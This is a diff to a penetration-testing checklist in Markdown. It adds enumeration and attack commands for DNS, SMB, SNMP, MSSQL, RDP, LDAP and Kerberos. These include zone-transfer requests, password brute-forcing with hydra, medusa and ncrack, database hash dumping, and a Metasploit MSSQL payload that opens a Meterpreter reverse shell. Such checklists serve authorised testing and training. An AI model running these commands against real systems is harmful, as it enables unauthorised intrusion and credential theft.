@@ -131,19 +131,33 @@ If you don't know the alive hosts,  you can scan the full subnet to find them, s
 ](https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/)
 - [ ] Check for code injection: [Owasp code injection](https://owasp.org/www-community/attacks/Code_Injection)
 ### DNS (Port 53)
+- [ ] Find domain names for host
+> whois $IP
+- [ ] Find IP and authoritative servers
+> nslookup domain.com
 - [ ] Resolve DNS
 > host website.com
 > nslookup website.com
-- [ ] whois
+- [ ] Find name servers
+> host -t ns domain.com
+- [ ] Find mail servers
+> host -t mx domain.com
 - [ ] Is DNS zone transfer possible?
-> host -l domain.name dns.server
-> dig axfr @dns-server domain.name
+> nmap --script dns-zone-transfer -p 53 domain.com
+- [ ] Request zone transfer
+	> host -l domain.name dns.server 
+	
+	> dig axfr @dns-server domain.name
+
+	> dnsrecon -d domain.com -t axfr
 - [ ] dnsrecon -d $IP -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml
 
 ###  POP (Port 110)
-- [x] Is username enumeration possible?
-- [x] Try nmap -script pop3-brute $IP -p 110 -v
-- [x] telnet $IP 110
+- [ ] Is username enumeration possible?
+- [ ] Try nmap -script pop3-brute $IP -p 110 -v
+- [ ] telnet $IP 110
+	- USER user@IP
+	- PASS admin
 	- LIST - once logged in list messages
 	- RETR \<MSG NUMBER\> - retrieve message
 	- QUIT
@@ -152,12 +166,22 @@ If you don't know the alive hosts,  you can scan the full subnet to find them, s
 - [ ] rpcinfo -p $IP
 
 ### SMB/RPC (Port 139/445)
-- [ ] nmap -script smb-protocols
+- [ ] Enumeration
+	> nmblookup -A $IP
+
+	>  enum4linux -a $IP
+	
+	>  nmap --script=smb-enum* --script-args=unsafe=1 -T5 $IP
+	
+	> nmap -script smb-enum-shares.nse –script-args=unsafe=1 -p445 $IP
+
+	> nmap -script smb-enum-users.nse –script-args=unsafe=1 -p445 $IP
+
+	> nmap -script smb-protocols $IP
 - [ ] nmap -n -p 139,445 -v --script smb-vuln* -oA nmap/smb-vulns  $IP
 - [ ] nmap -script smb-os-discovery.nse –script-args=unsafe=1 -p445 $IP
 - [ ] nmap -script smb-check-vulns.nse –script-args=unsafe=1 -p445 $IP
-- [ ] nmap -script smb-enum-shares.nse –script-args=unsafe=1 -p445 $IP
-- [ ] nmap -script smb-enum-users.nse –script-args=unsafe=1 -p445 $IP
+
 - [ ] nbtscan
 - [ ] enum4linux
 - [ ] Manual browsing (Prefer it whenever possible):
@@ -169,21 +193,41 @@ If you don't know the alive hosts,  you can scan the full subnet to find them, s
 > winexe -U username //INSERTIPADDRESS "cmd.exe" --system
 
 ### SNMP (161)
-- [ ] snmpwalk -c public -v1 $IP 
-- [ ] snmpcheck -t $IP -c public
-- [ ] onesixtyone -c names -i hosts
-- [ ] nmap -sT -p 161 -v -oA nmap/snmap_results $IP
-- [ ] snmpenum -t $IP
+- [ ] Enumeration
+	> for community in public private manager; do snmpwalk -c $community -v1 $IP; done
+
+	> snmpwalk -c public -v1 $IP
+	
+	> snmpenum -t $IP
+	
+	> snmpcheck -t $IP -c public
+	
+	> nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes $ip
+- [ ] Bruteforce community names
+> onesixtyone -c names -i hosts # fast
+
 
 
 ### MSSQL
+- [ ] Enumerate MSSQL Servers
+	> msf > use auxiliary/scanner/mssql/mssql_ping
+
+	> nmap -sU --script=ms-sql-info $IP
 - [ ] Password bruteforcing
-> hydra -l \<USERNAME\> -P /usr/share/seclists/Passwords/darkweb2017-top10000.txt $IP -s \<PORT\> -t 5 mssql
-> hydra -s \<PORT\> -C ./wordlists/mssql-default-userpass.txt -u -f $IP mssql
-> medusa -h $IP -M mssql -u sa -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt -e ns -F -t 5
+	> hydra -l \<USERNAME\> -P /usr/share/seclists/Passwords/darkweb2017-top10000.txt $IP -s \<PORT\> -t 5 mssql
+
+	> hydra -s \<PORT\> -C ./wordlists/mssql-default-userpass.txt -u -f $IP mssql
+
+	> medusa -h $IP -M mssql -u sa -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt -e ns -F -t 5
+
+	> msf > use auxiliary/scanner/mssql/mssql_login
 - [ ] Any known vulnerability?
 > nmap -vv -sV -Pn -p \<PORT\> --script=ms-sql-info,ms-sql-config,ms-sql-dump-hashes --script-args=mssql.instance-port=%s,smsql.username-sa,mssql.password-sa $IP
-
+- [ ] Gain shell using gathered credentials
+> msf > use exploit/windows/mssql/mssql_payload
+> msf exploit(mssql_payload) > set PAYLOAD windows/meterpreter/reverse_tcp
+- [ ] Log in to a MSSQL Server
+> sqsh -S $IP -U sa -P password -D db_name
 
 ### Oracle (1521)
 -  [ ] Default credentials
@@ -200,14 +244,25 @@ If you don't know the alive hosts,  you can scan the full subnet to find them, s
 > hydra -s \<PORT\> -C usr/share/wordlists/mysql-default-userpass.txt -u -f $IP mysql
 - [ ] Any known vulnerability?
 > nmap -sV -Pn -vv -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 $IP
+
 ### RDP (3389)
 - [ ] Use rpd-sec-check to enumerate security settings:
-> perl ./scripts/rdp-sec-check.pl $IP:\<ORT\>
+> perl ./scripts/rdp-sec-check.pl $IP:\<PORT\>
 - [ ] Use ncrack to brute force RDP:
 > ncrack -vv --user administrator -P /user/share/wordlists/rockyou.txt rdp://<\TARGET\>
+- [ ] Use hydra to bruteforce RDP:
+> hydra -t 4  -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$IP
+
 ### LDAP (389)
 - [ ]  LDAPSearch can be utilized to locate and retrieve directory entries
-	> ldapsearch -h \[IP\] -p \[PORT\] -x -s base
+	> ldapsearch -h $IP -p \<PORT\> -x -s base
+
+### Kerberos (88/464)
+- [ ] Passive network sniffing
+> kerbcrack
+- [ ] User enumeration
+> nmap -p88 --script krb5-enum-users --script-args krb5-enum-users.realm=research $IP
+- [ ] Test MS14-068
 
 ### Image File Investigation
 - [ ] Always use wget for downloading files to keep original timestamps and file information
